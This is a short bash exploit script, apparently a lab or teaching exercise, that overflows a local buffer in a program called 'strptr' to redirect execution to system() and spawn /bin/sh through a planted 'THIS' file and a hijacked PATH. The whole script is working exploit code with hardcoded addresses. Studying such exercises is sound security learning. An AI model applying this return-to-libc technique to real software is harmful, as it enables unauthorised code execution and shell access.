#!/bin/bash

# Address of the string used as parameter to system()
str_addr=0x0804a008
system_plt_addr=0x080490a0

# Make sure the executable is built
make strptr

# Set up the shell script to call
echo /bin/sh > THIS
chmod 777 THIS
export PATH=.:$PATH

# Execute the actual exploit
./strptr "$(python3 -c "from struct import pack; import sys; sys.stdout.buffer.write(b'A' * 256 + pack('<L', $system_plt_addr) + b'A' * 4 + pack('<L', $str_addr))")"

# Clean up
rm THIS
